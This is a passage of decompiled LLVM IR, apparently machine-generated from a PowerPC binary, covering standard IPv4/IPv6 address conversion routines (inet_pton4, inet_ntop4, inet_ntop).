  %v2_10016550 = sub i32 %v0_10016588.pre, %v0_10016544
  store i32 %v2_10016550, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br i1 %v4_10016588, label %dec_label_pc_100165bc, label %dec_label_pc_10016570.preheader

dec_label_pc_10016570.preheader:                  ; preds = %dec_label_pc_1001654c
  %v3_1001657024 = icmp slt i32 %v2_10016550, 1
  %v2_1001657426 = add i32 %v2_10016550, -1
  store i32 %v2_1001657426, i32* @r10, align 4
  %v2_1001657827 = add i32 %v1_10016588.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001657024, label %dec_label_pc_10016588.thread, label %dec_label_pc_10016564

dec_label_pc_10016564:                            ; preds = %dec_label_pc_10016570.preheader, %dec_label_pc_10016564.dec_label_pc_10016564_crit_edge
  %v0_10016564 = phi i32 [ %v0_10016564.pre, %dec_label_pc_10016564.dec_label_pc_10016564_crit_edge ], [ %v0_10016544, %dec_label_pc_10016570.preheader ]
  %v2_1001657829 = phi i32 [ %v2_10016578, %dec_label_pc_10016564.dec_label_pc_10016564_crit_edge ], [ %v2_1001657827, %dec_label_pc_10016570.preheader ]
  %v2_1001657428 = phi i32 [ %v2_10016574, %dec_label_pc_10016564.dec_label_pc_10016564_crit_edge ], [ %v2_1001657426, %dec_label_pc_10016570.preheader ]
  %v2_10016564 = add i32 %v0_10016564, %v2_1001657428
  %v3_10016564 = inttoptr i32 %v2_10016564 to i8*
  %v4_10016564 = load i8, i8* %v3_10016564, align 1
  %v5_10016564 = zext i8 %v4_10016564 to i32
  store i32 %v5_10016564, i32* %r0.global-to-local, align 4
  %v3_10016568 = inttoptr i32 %v2_1001657829 to i8*
  store i8 %v4_10016564, i8* %v3_10016568, align 1
  %v0_1001656c = load i32, i32* @r8, align 4
  %v1_1001656c = load i32, i32* @r24, align 4
  %v2_1001656c = load i32, i32* @r10, align 4
  %v3_1001656c = trunc i32 %v0_1001656c to i8
  %v4_1001656c = add i32 %v2_1001656c, %v1_1001656c
  %v5_1001656c = inttoptr i32 %v4_1001656c to i8*
  store i8 %v3_1001656c, i8* %v5_1001656c, align 1
  %v0_10016570.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10016570.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10016578.pre = load i32, i32* @r27, align 4
  %v3_10016570 = icmp slt i32 %v1_10016570.pre, %v0_10016570.pre
  %v2_10016574 = sub i32 %v1_10016570.pre, %v0_10016570.pre
  store i32 %v2_10016574, i32* @r10, align 4
  %v1_1001657c = add i32 %v0_10016570.pre, 1
  store i32 %v1_1001657c, i32* %r9.global-to-local, align 4
  br i1 %v3_10016570, label %dec_label_pc_10016588.thread, label %dec_label_pc_10016564.dec_label_pc_10016564_crit_edge

dec_label_pc_10016564.dec_label_pc_10016564_crit_edge: ; preds = %dec_label_pc_10016564
  %v2_10016578 = sub i32 %v1_10016578.pre, %v0_10016570.pre
  %v0_10016564.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10016564

dec_label_pc_10016588.thread:                     ; preds = %dec_label_pc_10016564, %dec_label_pc_10016570.preheader
  %v0_10016584.lcssa = phi i32 [ %v1_10016588.pre, %dec_label_pc_10016570.preheader ], [ %v1_10016578.pre, %dec_label_pc_10016564 ]
  store i32 %v0_10016584.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10016590

dec_label_pc_10016588:                            ; preds = %dec_label_pc_10016544
  br i1 %v4_10016588, label %dec_label_pc_10016590, label %dec_label_pc_100165bc

dec_label_pc_10016590:                            ; preds = %dec_label_pc_10016588.thread, %dec_label_pc_10016588
  %v0_10016590 = load i32, i32* @r22, align 4
  store i32 %v0_10016590, i32* @r3, align 4
  store i32 %v2_1001640c, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100165a0.603 to i32), i32* @lr, align 4
  %v0_1001659c = call i32 @memcpy()
  store i32 %v0_1001659c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100165c0

dec_label_pc_100165a8:                            ; preds = %dec_label_pc_100163ec
  %v0_100165a8 = call i32 @__errno_location()
  store i32 %v0_100165a8, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100165b4 = inttoptr i32 %v0_100165a8 to i32*
  store i32 97, i32* %v2_100165b4, align 4
  %v0_100165c4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100165c0

dec_label_pc_100165bc:                            ; preds = %dec_label_pc_100164b0, %dec_label_pc_100164a4, %dec_label_pc_10016468, %dec_label_pc_10016490, %dec_label_pc_1001654c, %dec_label_pc_100164f0, %dec_label_pc_100164dc, %dec_label_pc_10016588, %dec_label_pc_10016430, %dec_label_pc_10016528, %dec_label_pc_100164e4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100165c0

dec_label_pc_100165c0:                            ; preds = %dec_label_pc_100165a8, %dec_label_pc_10016590, %dec_label_pc_100163f8, %dec_label_pc_100165bc
  %v0_100165c4 = phi i32 [ %v0_100165c4.pre, %dec_label_pc_100165a8 ], [ 1, %dec_label_pc_10016590 ], [ %v3_10016400, %dec_label_pc_100163f8 ], [ 0, %dec_label_pc_100165bc ]
  store i32 %v0_100163d0, i32* %r0.global-to-local, align 4
  store i32 %v0_100165c4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100165c4

; uselistorder directives
  uselistorder i32 %v0_100165c4, { 1, 0 }
  uselistorder i32 %v2_10016574, { 1, 0 }
  uselistorder i32 %v0_10016570.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10016588, { 1, 0 }
  uselistorder i32 %v0_10016588.pre, { 1, 0 }
  uselistorder i32 %v0_10016534, { 1, 0 }
  uselistorder i32 %v0_10016588.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10016514, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100164bc, { 1, 0 }
  uselistorder i32 %v1_1001646c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 17, 7, 8, 11, 12, 9, 10, 2, 1, 18, 4, 3, 16, 13, 15, 14, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268526872, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_100165c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100165bc, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10016590, { 1, 0 }
  uselistorder label %dec_label_pc_10016564, { 1, 0 }
  uselistorder label %dec_label_pc_10016544, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016520, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10016448.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10016448, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10016630.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_100165d8 = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10016604 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10016604, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10016614.606 to i32), i32* @lr, align 4
  %v3_10016610 = call i32 @__GI_memset(i32 %v2_10016604, i32 0, i32 15)
  store i32 %v3_10016610, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_100166d42 = load i32, i32* @r1, align 4
  store i32 %v0_100166d42, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10016630

dec_label_pc_10016630:                            ; preds = %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge, %dec_label_pc_10016630.lr.ph
  %v2_10016650 = phi i32 [ %v2_100166d4, %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge ], [ %v0_100166d42, %dec_label_pc_10016630.lr.ph ]
  %v0_10016644 = phi i32 [ %v0_100166d4, %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge ], [ %v0_100166d42, %dec_label_pc_10016630.lr.ph ]
  %v0_10016634 = phi i32 [ %v1_100166d4, %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge ], [ 0, %dec_label_pc_10016630.lr.ph ]
  %v1_1001663c = phi i32 [ %v1_10016630.pre, %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge ], [ 0, %dec_label_pc_10016630.lr.ph ]
  %v0_10016630 = load i32, i32* %r31.global-to-local, align 4
  %v2_10016630 = add i32 %v0_10016630, %v1_1001663c
  %v3_10016630 = inttoptr i32 %v2_10016630 to i8*
  %v4_10016630 = load i8, i8* %v3_10016630, align 1
  %v5_10016630 = zext i8 %v4_10016630 to i32
  store i32 %v5_10016630, i32* %r10.global-to-local, align 4
  store i32 %v0_10016634, i32* %r8.global-to-local, align 4
  %v1_10016638 = add i32 %v0_10016634, 1
  store i32 %v1_10016638, i32* %r11.global-to-local, align 4
  store i32 %v2_10016630, i32* %r3.global-to-local, align 4
  %v1_10016640 = load i32, i32* @r28, align 4
  %v2_10016640 = udiv i32 %v5_10016630, %v1_10016640
  %v2_10016644 = add i32 %v1_10016638, %v0_10016644
  store i32 %v2_10016644, i32* %r6.global-to-local, align 4
  %v1_10016648 = add nuw nsw i32 %v2_10016640, 48
  %v1_1001664c = urem i32 %v1_10016648, 256
  store i32 %v1_1001664c, i32* %r0.global-to-local, align 4
  %v1_10016650 = trunc i32 %v1_10016648 to i8
  %v3_10016650 = add i32 %v2_10016650, 8
  %v4_10016650 = inttoptr i32 %v3_10016650 to i8*
  store i8 %v1_10016650, i8* %v4_10016650, align 1
  %v0_10016654 = load i32, i32* %r0.global-to-local, align 4
  %v3_10016654 = icmp eq i32 %v0_10016654, 48
  %v0_1001665c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001665c = load i32, i32* %r5.global-to-local, align 4
  %v2_1001665c = udiv i32 %v0_1001665c, %v1_1001665c
  store i32 %v2_1001665c, i32* %r9.global-to-local, align 4
  br i1 %v3_10016654, label %dec_label_pc_1001665c, label %dec_label_pc_10016688

dec_label_pc_1001665c:                            ; preds = %dec_label_pc_10016630
  %v2_10016660 = udiv i32 %v2_1001665c, %v1_1001665c
  %tmp18 = mul i32 %v2_10016660, -10
  %v2_10016668 = add i32 %v2_1001665c, 48
  %v1_1001666c = add i32 %v2_10016668, %tmp18
  store i32 %v1_1001666c, i32* %r9.global-to-local, align 4
  %v1_10016670 = urem i32 %v1_1001666c, 256
  store i32 %v1_10016670, i32* %r0.global-to-local, align 4
  %v1_10016674 = trunc i32 %v1_1001666c to i8
  %v2_10016674 = load i32, i32* %r7.global-to-local, align 4
  %v3_10016674 = add i32 %v2_10016674, 8
  %v4_10016674 = inttoptr i32 %v3_10016674 to i8*
  store i8 %v1_10016674, i8* %v4_10016674, align 1
  %v0_10016678 = load i32, i32* %r0.global-to-local, align 4
  %v3_10016678 = icmp eq i32 %v0_10016678, 48
  br i1 %v3_10016678, label %dec_label_pc_100166a4, label %dec_label_pc_10016680

dec_label_pc_10016680:                            ; preds = %dec_label_pc_1001665c
  %v0_10016680 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10016680, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100166a4

dec_label_pc_10016688:                            ; preds = %dec_label_pc_10016630
  %v0_1001668c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001668c = add i32 %v0_1001668c, 1
  store i32 %v1_1001668c, i32* %r8.global-to-local, align 4
  %v2_10016690 = udiv i32 %v2_1001665c, %v1_1001665c
  %v1_10016694 = mul i32 %v2_10016690, 10
  store i32 %v1_10016694, i32* %r0.global-to-local, align 4
  %v2_10016698 = sub i32 %v2_1001665c, %v1_10016694
  %v1_1001669c = add i32 %v2_10016698, 48
  store i32 %v1_1001669c, i32* %r9.global-to-local, align 4
  %v1_100166a0 = trunc i32 %v1_1001669c to i8
  %v2_100166a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_100166a0 = add i32 %v2_100166a0, 8
  %v4_100166a0 = inttoptr i32 %v3_100166a0 to i8*
  store i8 %v1_100166a0, i8* %v4_100166a0, align 1
  br label %dec_label_pc_100166a4

dec_label_pc_100166a4:                            ; preds = %dec_label_pc_1001665c, %dec_label_pc_10016680, %dec_label_pc_10016688
  %v0_100166a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100166a4 = inttoptr i32 %v0_100166a4 to i8*
  %v2_100166a4 = load i8, i8* %v1_100166a4, align 1
  %v3_100166a4 = zext i8 %v2_100166a4 to i32
  %v0_100166a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100166a8 = add i32 %v0_100166a8, 1
  %v0_100166ac = load i32, i32* @r1, align 4
  %v2_100166ac = add i32 %v0_100166ac, %v0_100166a8
  store i32 %v2_100166ac, i32* %r10.global-to-local, align 4
  %v2_100166b0 = add i32 %v1_100166a8, %v0_100166ac
  store i32 %v2_100166b0, i32* %r8.global-to-local, align 4
  %v1_100166b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100166b4 = udiv i32 %v3_100166a4, %v1_100166b4
  %v1_100166b8 = add i32 %v0_100166a8, 2
  store i32 %v1_100166b8, i32* %r11.global-to-local, align 4
  %v0_100166bc = load i32, i32* %r4.global-to-local, align 4
  %v1_100166bc = add i32 %v0_100166bc, 1
  store i32 %v1_100166bc, i32* %r4.global-to-local, align 4
  %v1_100166c0 = mul nuw nsw i32 %v2_100166b4, 10
  store i32 %v1_100166c0, i32* %r0.global-to-local, align 4
  %v2_100166c4 = sub nsw i32 %v3_100166a4, %v1_100166c0
  %v1_100166c8 = add nsw i32 %v2_100166c4, 48
  store i32 %v1_100166c8, i32* %r9.global-to-local, align 4
  %v1_100166cc = trunc i32 %v1_100166c8 to i8
  %v3_100166cc = add i32 %v2_100166ac, 8
  %v4_100166cc = inttoptr i32 %v3_100166cc to i8*
  store i8 %v1_100166cc, i8* %v4_100166cc, align 1
  %v0_100166d0 = load i32, i32* %r12.global-to-local, align 4
  %v1_100166d0 = trunc i32 %v0_100166d0 to i8
  %v2_100166d0 = load i32, i32* %r8.global-to-local, align 4
  %v3_100166d0 = add i32 %v2_100166d0, 8
  %v4_100166d0 = inttoptr i32 %v3_100166d0 to i8*
  store i8 %v1_100166d0, i8* %v4_100166d0, align 1
  %v0_100166d4 = load i32, i32* @r1, align 4
  %v1_100166d4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100166d4 = add i32 %v1_100166d4, %v0_100166d4
  store i32 %v2_100166d4, i32* %r7.global-to-local, align 4
  %v0_100166d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100166d8 = add i32 %v0_100166d8, -1
  store i32 %v1_100166d8, i32* %ctr.global-to-local, align 4
  %v2_100166d8 = icmp eq i32 %v1_100166d8, 0
  br i1 %v2_100166d8, label %dec_label_pc_100166dc, label %dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge

dec_label_pc_100166a4.dec_label_pc_10016630_crit_edge: ; preds = %dec_label_pc_100166a4
  %v1_10016630.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10016630

dec_label_pc_100166dc:                            ; preds = %dec_label_pc_100166a4
  %v2_100166dc = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_100166dc, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100166e4 = add i32 %v1_100166d4, %v2_100166dc
  store i32 %v2_100166e4, i32* %r9.global-to-local, align 4
  store i32 %v2_100166dc, i32* @r3, align 4
  %v3_100166ec = add i32 %v2_100166e4, -1
  %v4_100166ec = inttoptr i32 %v3_100166ec to i8*
  store i8 0, i8* %v4_100166ec, align 1
  %v0_100166f0 = call i32 @__GI_strlen()
  store i32 %v0_100166f0, i32* %r3.global-to-local, align 4
  %v1_100166f4 = load i32, i32* @r30, align 4
  %v3_100166f4 = icmp ugt i32 %v0_100166f0, %v1_100166f4
  br i1 %v3_100166f4, label %dec_label_pc_100166fc, label %dec_label_pc_10016710

dec_label_pc_100166fc:                            ; preds = %dec_label_pc_100166dc
  %v0_100166fc = call i32 @__errno_location()
  store i32 %v0_100166fc, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10016708 = inttoptr i32 %v0_100166fc to i32*
  store i32 28, i32* %v2_10016708, align 4
  %v0_10016724.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10016720

dec_label_pc_10016710:                            ; preds = %dec_label_pc_100166dc
  %v0_10016710 = load i32, i32* @r29, align 4
  store i32 %v0_10016710, i32* %r3.global-to-local, align 4
  store i32 %v2_100166dc, i32* %r4.global-to-local, align 4
  %v2_10016718 = bitcast i16* %stack_var_-56 to i8*
  %v3_10016718 = call i32 @strcpy(i32 %v0_10016710, i8* %v2_10016718)
  store i32 %v3_10016718, i32* %r3.global-to-local, align 4
  store i32 %v3_10016718, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10016720

dec_label_pc_10016720:                            ; preds = %dec_label_pc_100166fc, %dec_label_pc_10016710
  %v0_10016724 = phi i32 [ %v0_10016724.pre, %dec_label_pc_100166fc ], [ %v3_10016718, %dec_label_pc_10016710 ]
  store i32 %v0_100165d8, i32* %r0.global-to-local, align 4
  store i32 %v0_10016724, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016724

; uselistorder directives
  uselistorder i32 %v0_10016724, { 1, 0 }
  uselistorder i32 %v2_100166dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100166d8, { 1, 0 }
  uselistorder i32 %v2_100166d4, { 1, 0 }
  uselistorder i32 %v0_100166a8, { 1, 0, 2 }
  uselistorder i32 %v1_1001666c, { 1, 0, 2 }
  uselistorder i32 %v2_1001665c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10016648, { 1, 0 }
  uselistorder i32 %v0_10016634, { 1, 0 }
  uselistorder i32 %v0_100166d42, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 100, { 2, 3, 0, 1 }
  uselistorder i32 15, { 0, 2, 3, 4, 1, 13, 10, 8, 9, 12, 5, 11, 6, 7 }
  uselistorder i32 268566528, { 31, 35, 36, 32, 0, 37, 38, 33, 34, 27, 28, 1, 2, 3, 4, 29, 5, 30, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_10016720, { 1, 0 }
  uselistorder label %dec_label_pc_100166a4, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_10016738 = icmp slt i32 %arg1, 2
  %v3_10016738 = icmp eq i32 %arg1, 2
  store i1 %v1_10016738, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10016738, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_10016738, label %dec_label_pc_10016768, label %dec_label_pc_1001675c

dec_label_pc_1001675c:                            ; preds = %entry
  %v1_1001675c = icmp slt i32 %arg1, 10
  %v3_1001675c = icmp eq i32 %arg1, 10
  store i1 %v1_1001675c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001675c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001675c, label %dec_label_pc_100167a0.lr.ph, label %dec_label_pc_100169b4

dec_label_pc_10016768:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10016778.608 to i32), i32* @lr, align 4
  %v3_10016774 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_100169ac

dec_label_pc_100167a0.lr.ph:                      ; preds = %dec_label_pc_1001675c
  %v2_1001677c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1001677c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016790.609 to i32), i32* @lr, align 4
  %v3_1001678c = call i32 @__GI_memset(i32 %v2_1001677c, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100167c015 = load i32, i32* @r27, align 4
  store i32 %v0_100167c015, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100167a0

dec_label_pc_100167a0:                            ; preds = %dec_label_pc_100167a0.lr.ph, %dec_label_pc_100167a0
  %v1_100167b4 = phi i32 [ 0, %dec_label_pc_100167a0.lr.ph ], [ %v1_100167c4, %dec_label_pc_100167a0 ]
  %v0_100167a0 = phi i32 [ %v0_100167c015, %dec_label_pc_100167a0.lr.ph ], [ %v0_100167c0, %dec_label_pc_100167a0 ]
  %v0_100167a8 = phi i32 [ %v0_100167c015, %dec_label_pc_100167a0.lr.ph ], [ %v2_100167c0, %dec_label_pc_100167a0 ]
  %v1_100167a0 = phi i32 [ 0, %dec_label_pc_100167a0.lr.ph ], [ %v0_100167b8, %dec_label_pc_100167a0 ]
  %v2_100167a0 = add i32 %v0_100167a0, %v1_100167a0
  %v3_100167a0 = inttoptr i32 %v2_100167a0 to i8*
  %v4_100167a0 = load i8, i8* %v3_100167a0, align 1
  %v5_100167a0 = zext i8 %v4_100167a0 to i32
  %v1_100167a4 = add i32 %v1_100167a0, 2
  store i32 %v1_100167a4, i32* %r11.global-to-local, align 4
  %v1_100167a8 = add i32 %v0_100167a8, 1
  %v2_100167a8 = inttoptr i32 %v1_100167a8 to i8*
  %v3_100167a8 = load i8, i8* %v2_100167a8, align 1
  %v4_100167a8 = zext i8 %v3_100167a8 to i32
  %v1_100167ac = mul nuw nsw i32 %v5_100167a0, 256
  %v2_100167b0 = or i32 %v4_100167a8, %v1_100167ac
  %v2_100167b4 = load i32, i32* %r29.global-to-local, align 4
  %v3_100167b4 = add i32 %v2_100167b4, %v1_100167b4
  %v4_100167b4 = inttoptr i32 %v3_100167b4 to i32*
  store i32 %v2_100167b0, i32* %v4_100167b4, align 4
  %v0_100167b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100167b8 = udiv i32 %v0_100167b8, 2
  %v0_100167c0 = load i32, i32* @r27, align 4
  %v2_100167c0 = add i32 %v0_100167c0, %v0_100167b8
  store i32 %v2_100167c0, i32* %r9.global-to-local, align 4
  %v1_100167c4 = mul i32 %v1_100167b8, 4
  %v0_100167c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100167c8 = add i32 %v0_100167c8, -1
  store i32 %v1_100167c8, i32* %ctr.global-to-local, align 4
  %v2_100167c8 = icmp eq i32 %v1_100167c8, 0
  br i1 %v2_100167c8, label %dec_label_pc_100167e8.lr.ph, label %dec_label_pc_100167a0

dec_label_pc_100167e8.lr.ph:                      ; preds = %dec_label_pc_100167a0
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100167e8

dec_label_pc_100167e8:                            ; preds = %dec_label_pc_100167e8.lr.ph, %dec_label_pc_10016834
  %v0_10016838 = phi i32 [ 8, %dec_label_pc_100167e8.lr.ph ], [ %v1_10016838, %dec_label_pc_10016834 ]
  %v0_10016828 = phi i32 [ -1, %dec_label_pc_100167e8.lr.ph ], [ %v0_1001682842, %dec_label_pc_10016834 ]
  %v0_10016818 = phi i32 [ -1, %dec_label_pc_100167e8.lr.ph ], [ %v0_1001681839, %dec_label_pc_10016834 ]
  %v0_100167ec = phi i32 [ -1, %dec_label_pc_100167e8.lr.ph ], [ %v0_100167ec35, %dec_label_pc_10016834 ]
  %v0_10016834 = phi i32 [ 0, %dec_label_pc_100167e8.lr.ph ], [ %v1_10016834, %dec_label_pc_10016834 ]
  %v1_100167e8 = mul i32 %v0_10016834, 4
  %v3_100167ec = icmp eq i32 %v0_100167ec, -1
  %v2_100167f0 = add i32 %v1_100167e8, %v2_1001677c
  %v3_100167f0 = inttoptr i32 %v2_100167f0 to i32*
  %v4_100167f0 = load i32, i32* %v3_100167f0, align 4
  %v3_100167f4 = icmp eq i32 %v4_100167f0, 0
  br i1 %v3_100167f4, label %dec_label_pc_100167fc, label %dec_label_pc_10016814

dec_label_pc_100167fc:                            ; preds = %dec_label_pc_100167e8
  br i1 %v3_100167ec, label %dec_label_pc_10016800, label %dec_label_pc_1001680c

dec_label_pc_10016800:                            ; preds = %dec_label_pc_100167fc
  store i32 %v0_10016834, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10016834

dec_label_pc_1001680c:                            ; preds = %dec_label_pc_100167fc
  %v0_1001680c = load i32, i32* @r31, align 4
  %v1_1001680c = add i32 %v0_1001680c, 1
  store i32 %v1_1001680c, i32* @r31, align 4
  br label %dec_label_pc_10016834

dec_label_pc_10016814:                            ; preds = %dec_label_pc_100167e8
  br i1 %v3_100167ec, label %dec_label_pc_10016834, label %dec_label_pc_10016818

dec_label_pc_10016818:                            ; preds = %dec_label_pc_10016814
  %v3_10016818 = icmp eq i32 %v0_10016818, -1
  %v0_1001682c.pre = load i32, i32* @r31, align 4
  %v1_10016820 = load i32, i32* @r30, align 4
  %v3_10016820 = icmp sgt i32 %v0_1001682c.pre, %v1_10016820
  %or.cond = or i1 %v3_10016818, %v3_10016820
  br i1 %or.cond, label %dec_label_pc_10016828, label %dec_label_pc_10016830

dec_label_pc_10016828:                            ; preds = %dec_label_pc_10016818
  store i32 %v0_10016828, i32* @r28, align 4
  store i32 %v0_1001682c.pre, i32* @r30, align 4
  br label %dec_label_pc_10016830

dec_label_pc_10016830:                            ; preds = %dec_label_pc_10016818, %dec_label_pc_10016828
  %v0_1001681840 = phi i32 [ %v0_10016828, %dec_label_pc_10016828 ], [ %v0_10016818, %dec_label_pc_10016818 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10016834

dec_label_pc_10016834:                            ; preds = %dec_label_pc_10016814, %dec_label_pc_1001680c, %dec_label_pc_10016800, %dec_label_pc_10016830
  %v0_1001682842 = phi i32 [ %v0_10016828, %dec_label_pc_10016814 ], [ %v0_10016828, %dec_label_pc_1001680c ], [ %v0_10016834, %dec_label_pc_10016800 ], [ -1, %dec_label_pc_10016830 ]
  %v0_100167ec35 = phi i32 [ -1, %dec_label_pc_10016814 ], [ %v0_100167ec, %dec_label_pc_1001680c ], [ %v0_10016834, %dec_label_pc_10016800 ], [ -1, %dec_label_pc_10016830 ]
  %v0_1001681839 = phi i32 [ %v0_10016818, %dec_label_pc_10016814 ], [ %v0_10016818, %dec_label_pc_1001680c ], [ %v0_10016818, %dec_label_pc_10016800 ], [ %v0_1001681840, %dec_label_pc_10016830 ]
  %v1_10016834 = add nuw nsw i32 %v0_10016834, 1
  store i32 %v1_10016834, i32* %r11.global-to-local, align 4
  %v1_10016838 = add nsw i32 %v0_10016838, -1
  store i32 %v1_10016838, i32* %ctr.global-to-local, align 4
  %v2_10016838 = icmp eq i32 %v1_10016838, 0
